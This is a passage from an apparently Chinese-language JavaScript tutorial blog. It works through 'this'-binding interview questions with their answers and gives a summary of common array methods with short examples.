<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;window&quot;</span>;<br><br><span class="hljs-keyword">var</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;person&quot;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(this.name);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> sss = person.sayName;<br>  sss(); <br>  person.sayName(); <br>  (person.sayName)();<br>  (b = person.sayName)(); <br>&#125;<br><br>sayName();<br></code></pre></td></tr></table></figure>

<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9c9a3c7309c944dd9cb703aec61230dc~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<p>解析：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> sss = person.<span class="hljs-property">sayName</span>;<br>  <span class="hljs-title function_">sss</span>(); <span class="hljs-comment">// window(独立函数调用)</span><br>  person.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// person(隐式绑定)？</span><br>  (person.<span class="hljs-property">sayName</span>)(); <span class="hljs-comment">// person(隐式绑定)</span><br>  (b = person.<span class="hljs-property">sayName</span>)(); <span class="hljs-comment">// window(赋值表达式，独立函数调用)</span><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;window&#x27;</span><br><br><span class="hljs-keyword">var</span> person1 = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;person1&#x27;</span>,<br>  <span class="hljs-attr">foo1</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>  &#125;,<br>  <span class="hljs-attr">foo2</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>),<br>  <span class="hljs-attr">foo3</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">foo4</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> person2 = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;person2&#x27;</span> &#125;<br><br>person1.<span class="hljs-title function_">foo1</span>(); <br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2); <br><br>person1.<span class="hljs-title function_">foo2</span>();  <br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2); <br><br>person1.<span class="hljs-title function_">foo3</span>()(); <br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)(); <br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2); <br><br>person1.<span class="hljs-title function_">foo4</span>()(); <br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)(); <br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2); <br></code></pre></td></tr></table></figure>

<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dd44e783e48f4f45a47548689201a110~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<p>解析：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">person1.<span class="hljs-title function_">foo1</span>(); <span class="hljs-comment">// person1(隐式绑定)</span><br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// person2(显示绑定优先级大于隐式绑定) </span><br><br>person1.<span class="hljs-title function_">foo2</span>();  <span class="hljs-comment">// window(箭头函数不绑定this，上层作用域是全局，this是window)</span><br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// window(箭头函数，上层作用域的this是window)</span><br><br>person1.<span class="hljs-title function_">foo3</span>()(); <span class="hljs-comment">// window(默认绑定，独立函数调用)</span><br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)(); <span class="hljs-comment">// window(默认绑定，独立函数调用) </span><br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// person2(显示绑定)</span><br><br>person1.<span class="hljs-title function_">foo4</span>()(); <span class="hljs-comment">// person1(箭头函数，上层作用域的this是person1)</span><br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)(); <span class="hljs-comment">// person2(箭头函数，上层作用域的this是person2)</span><br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// person1(箭头函数，上层作用域的this是person1)</span><br></code></pre></td></tr></table></figure>

<p>this面试题三</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;window&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span> (name) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo1</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>  &#125;,<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo2</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>),<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo3</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;,<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo4</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person1&#x27;</span>)<br><span class="hljs-keyword">var</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person2&#x27;</span>)<br><br>person1.<span class="hljs-title function_">foo1</span>() <br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2) <br><br>person1.<span class="hljs-title function_">foo2</span>() <br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2)<br><br>person1.<span class="hljs-title function_">foo3</span>()() <br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2)<br><br>person1.<span class="hljs-title function_">foo4</span>()()<br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2)<br></code></pre></td></tr></table></figure>

<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6122cb5eaf5645d7a14be6a7e778d8c1~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<p>解析：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">person1.<span class="hljs-title function_">foo1</span>() <span class="hljs-comment">// person1</span><br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person2(显示绑定高于隐式绑定)</span><br><br>person1.<span class="hljs-title function_">foo2</span>() <span class="hljs-comment">// person1（箭头函数，上层作用域的this是person1）</span><br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person1 （箭头函数，上层作用域的this是person1）</span><br><br>person1.<span class="hljs-title function_">foo3</span>()() <span class="hljs-comment">// window（独立函数调用）</span><br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)() <span class="hljs-comment">// window</span><br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person2</span><br><br>person1.<span class="hljs-title function_">foo4</span>()() <span class="hljs-comment">// person1</span><br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)() <span class="hljs-comment">// person2 </span><br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person1</span><br></code></pre></td></tr></table></figure>

<p>this面试题四</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;window&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span> (name) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span> = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;obj&#x27;</span>,<br>    <span class="hljs-attr">foo1</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">foo2</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person1&#x27;</span>)<br><span class="hljs-keyword">var</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person2&#x27;</span>)<br><br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo1</span>()() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo1</span>().<span class="hljs-title function_">call</span>(person2) <br><br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo2</span>()() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo2</span>().<span class="hljs-title function_">call</span>(person2) <br></code></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1618324119445da8dc6d61f653233a1~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="8、数据方法总结"><a href="#8、数据方法总结" class="headerlink" title="8、数据方法总结"></a>8、数据方法总结</h3><h5 id="一、改变原数组的方法"><a href="#一、改变原数组的方法" class="headerlink" title="一、改变原数组的方法"></a>一、改变原数组的方法</h5><ol>
<li>push（） 末尾添加数据</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.push(</strong> <strong>数据)</strong></p>
<p><strong>作用:</strong> 就是往数组末尾添加数据</p>
<p><strong>返回值:</strong> 就是这个数组的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //push">var arr = [10, 20, 30, 40]<br>res = arr.push(20)<br>console.log(arr);//[10,20,30,40,20]<br>console.log(res);//5<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>pop（） 末尾出删除数据</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.pop()</strong></p>
<p><strong>作用:</strong> 就是从数组的末尾删除一个数据</p>
<p><strong>返回值:</strong> 就是你删除的那个数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //pop">var arr = [10, 20, 30, 40] <br>res =arr.pop()<br>console.log(arr);//[10,20,30]<br>console.log(res);//40<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>unshift（） 头部添加数据</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.unshift(</strong> <strong>数据)</strong></p>
<p><strong>作用:</strong> 就是在数组的头部添加数据</p>
<p><strong>返回值:</strong> 就是数组的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //pop">var arr = [10, 20, 30, 40]<br>res=arr.unshift(99)<br>console.log(arr);//[99,10,20,30,40]<br>console.log(res);//5<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>shift（） 头部删除数据</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.shift()</strong></p>
<p><strong>作用:</strong> 头部删除一个数据</p>
<p><strong>返回值:</strong> 就是删除掉的那个数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //shift">var arr = [10, 20, 30, 40]<br>res=arr.shift()<br>console.log(arr);[20,30,40]<br>console.log(res);10<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>reverse（） 翻转数组</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.reverse()</strong></p>
<p><strong>作用:</strong> 就是用来翻转数组的</p>
<p><strong>返回值:</strong> 就是翻转好的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //reverse">var arr = [10, 20, 30, 40]<br>res=arr.reverse()<br>console.log(arr);//[40,30,20,10]<br>console.log(res);//[40,30,20,10]<br></code></pre></td></tr></table></figure>

<ol start="6">
<li>sort（） 排序</li>
</ol>
<p>语法一: 数组名.sort() 会排序 会按照位排序</p>
<p>语法二: 数组名.sort(function (a,b) {return a-b}) 会正序排列</p>
<p>语法三: 数组名.sort(function (a,b) {return b-a}) 会倒序排列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs //sort()">var arr = [2, 63, 48, 5, 4, 75, 69, 11, 23]<br>arr.sort()<br>console.log(arr);<br>arr.sort(function(a,b)&#123;return(a-b)&#125;)<br>console.log(arr);<br>arr.sort(function(a,b)&#123;return(b-a)&#125;)<br>console.log(arr);<br></code></pre></td></tr></table></figure>

<ol start="7">
<li>splice（）  截取数组</li>
</ol>
<p>语法一: 数组名.splice(开始索引,多少个)</p>
<p>作用: 就是用来截取数组的</p>
<p>返回值: 是一个新数组 里面就是你截取出来的数据</p>
<p>语法二: 数组名.splice(开始索引,多少个,你要插入的数据)</p>
<p>作用: 删除并插入数据</p>
<p>注意: 从你的开始索引起</p>
<p>返回值: 是一个新数组 里面就是你截取出来的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs //splice()">var arr = [2, 63, 48, 5, 4, 75]<br>res = arr.splice(1,2)<br>console.log(arr);<br>console.log(res);<br>//******************************<br>//splice() 语法二<br>var arr = [2, 63, 48, 5, 4, 75]<br>res = arr.splice(1,1,99999,88888)<br>console.log(arr);<br>console.log(res);<br></code></pre></td></tr></table></figure>

<h5 id="二、不改变原数组的方法"><a href="#二、不改变原数组的方法" class="headerlink" title="二、不改变原数组的方法"></a>二、不改变原数组的方法</h5><ol>
<li>concat（）合并数组</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.concat(</strong> <strong>数据)</strong></p>
<p><strong>作用:</strong> 合并数组的</p>
<p><strong>返回值:</strong> 一个新的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //concat">var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.concat(20,&quot;小敏&quot;,50)<br>console.log(arr) <br>console.log(res);<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>join（） 数组转字符串</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.join(‘</strong> <strong>连接符’)</strong></p>
<p><strong>作用:</strong> 就是把一个数组转成字符串</p>
<p><strong>返回值:</strong> 就是转好的一个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //join">var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.join(&quot;+&quot;)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>slice（）截取数组的一部分数据</li>
</ol>
<p><strong>语法:</strong> <strong>数组名.slice(</strong> <strong>开始索引,</strong> <strong>结束索引)</strong></p>
<p><strong>作用:</strong> 就是截取数组中的一部分数据</p>
<p><strong>返回值:</strong> 就是截取出来的数据 放到一个新的数组中</p>
<p><strong>注意:</strong> 包前不好后 包含开始索引不包含结束索引</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //slice">var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.slice(1,4)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>indexOf 从左检查数组中有没有这个数值</li>
</ol>
<p><strong>语法一:</strong> <strong>数组名.indexOf(</strong> <strong>要查询的数据)</strong></p>
<p><strong>作用:</strong> 就是检查这个数组中有没有该数据</p>
<p>如果有就返回该数据<strong>第一次</strong>出现的索引</p>
<p>如果没有返回 -1</p>
<p><strong>语法二:</strong> <strong>数组名.indexOf(</strong> <strong>要查询的数据,</strong> <strong>开始索引)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs //indexOf">//indexOf<br>复制代码var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.indexOf(10)<br>console.log(arr)<br>console.log(res);<br>//*************************************<br>//indexOf  语法二<br>var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.indexOf(10,1)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>lastIndexOf 从右检查数组中有没有这个数值</li>
</ol>
<p><strong>语法一:</strong> <strong>数组名.indexOf(</strong> <strong>要查询的数据)</strong></p>
<p><strong>作用:</strong> 就是检查这个数组中有没有该数据</p>
<p>如果有就返回该数据<strong>第一次</strong>出现的索引</p>
<p>如果没有返回 -1</p>
<p><strong>语法二:</strong> <strong>数组名.lastIndexOf(</strong> <strong>要查询的数据,</strong> <strong>开始索引)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs //lastIndexOf">//lastIndexOf<br>复制代码var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.lastIndexOf(50)<br>console.log(arr) <br>console.log(res);<br>//*************************************<br>//lastIndexOf 语法二<br>var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.lastIndexOf(50,4)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure>

<h5 id="三、ES6新增的数组方法"><a href="#三、ES6新增的数组方法" class="headerlink" title="三、ES6新增的数组方法"></a>三、ES6新增的数组方法</h5><ol>
<li>forEach()  用来循环遍历的 for</li>
</ol>
<p>语法: 数组名.forEach(function (item,index,arr) {})</p>
<ul>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 就是用来循环遍历数组的 代替了我们的for</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs //forEach">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.forEach(function (item, index, arr) &#123;<br>    console.log(item, &quot;------&quot;, index, &quot;-------&quot;, arr);<br>&#125;)<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>map  映射数组的</li>
</ol>
<p>语法: 数组名.map(function (item,index,arr) {})</p>
<ul>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 就是用来映射</p>
<p>返回值: 必然是一个数组 一个映射完毕的数组；这个数组合原数组长度一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //map">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.map(function (item) &#123;<br>    return item*1000<br>&#125;)<br>console.log(res);<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>filter  过滤数组</li>
</ol>
<p>语法: 数组名.filter(function (item,index,arr) {})</p>
<ul>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 用来过滤数组的</p>
<p>返回值: 如果有就是过滤(筛选)出来的数据 保存在一个数组中；如果没有返回一个空数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //filter">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.filter(function (item) &#123;<br>    return item &gt; 2<br>&#125;)<br>console.log(res);<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>every  判断数组是不是满足所有条件</li>
</ol>
<p>语法: 数组名.every(function (item,index,arr) {})</p>
<ul>
<li>item : 这个表示的是数组中的每一项</li>
<li>index : 这个表示的是每一项对应的索引</li>
<li>arr : 这个表示的是原数组</li>
</ul>
<p>作用: 主要是用来判断数组中是不是 每一个 都满足条件</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">只有所有的都满足条件返回的是<span class="hljs-literal">true</span><br><br>只要有一个不满足返回的就是<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>

<p>返回值: 是一个布尔值 注意: 要以return的形式执行返回条件</p>
